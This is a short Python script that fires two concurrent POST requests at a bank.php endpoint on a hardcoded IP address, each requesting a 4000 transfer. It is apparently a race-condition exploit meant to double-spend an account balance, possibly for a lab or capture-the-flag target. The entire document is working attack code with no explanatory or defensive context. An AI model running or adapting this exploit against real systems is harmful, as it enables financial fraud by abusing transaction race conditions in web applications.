import requests
import threading

url = "http://18.188.42.158/bank.php?id=dc90a0a10c79e341f5b521da39dbc585"


def make_money():
	data = {"transfer": 4000, "account": "Transfer to B"}
	response = requests.post(url,data=data)
	print(response.text)

try:

	t1 = threading.Thread(target=make_money, args=[])
	t2 = threading.Thread(target=make_money, args=[])
	t1.start()
	t2.start()

except:
   print("Error: unable to start thread")